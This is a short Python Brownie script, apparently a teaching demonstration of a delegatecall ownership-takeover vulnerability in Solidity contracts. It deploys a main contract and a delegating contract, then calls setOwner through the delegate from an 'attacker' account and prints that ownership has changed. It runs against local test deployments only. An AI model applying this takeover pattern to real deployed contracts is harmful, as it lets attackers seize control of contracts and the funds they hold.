from brownie import DelegateExample, MainContract, Contract, accounts, network


def main():
    owner = accounts[0]
    attacker = accounts[1]

    main_contract = MainContract.deploy({"from": owner})
    delegate_contract = DelegateExample.deploy(main_contract, {"from": owner})

    delegate_attack = Contract.from_abi("MainContract", delegate_contract, main_contract.abi)

    print(f"Current owner of the contract delegate_contract is {delegate_contract.owner()}")

    delegate_attack.setOwner({"from": attacker})

    print(f"New owner of the contract delegate_contract is {delegate_contract.owner()}")
    print(f"attacker address is {attacker}")

    network.disconnect()
